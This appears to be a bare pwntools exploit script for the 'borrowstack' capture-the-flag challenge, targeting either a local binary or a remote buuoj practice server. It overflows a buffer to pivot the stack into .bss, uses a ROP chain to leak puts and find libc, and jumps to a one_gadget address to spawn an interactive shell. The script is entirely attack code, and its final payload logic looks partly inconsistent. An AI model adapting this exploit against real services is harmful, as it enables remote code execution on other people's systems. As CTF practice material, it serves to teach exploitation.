import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./borrowstack')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./borrowstack')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',26242)
			elf=ELF('./borrowstack')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]



		bss=0x601080
		pay='\x00'*0x60+p64(bss+0x80)+p64(0x400699)
		io.recv()
		io.send(pay)
		io.recv()
		pay='\x00'*0x80+p64(bss+0xa0)
		# pay+=p64(0x400656) 
		pay+=p64(0x0000000000400703)
		pay+=p64(elf.got['puts'])
		# pay+=p64(0x0000000000400701)+p64(0)*2
		pay+=p64(elf.plt['puts'])+p64(0x400680)
		# gdb.attach(io)
		# pause()
		io.send(pay)
		io.recv()
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['puts']
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		pay+=p64(libc_base+0x4526a)
		io.recv()
		io.send(pay)
		





		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue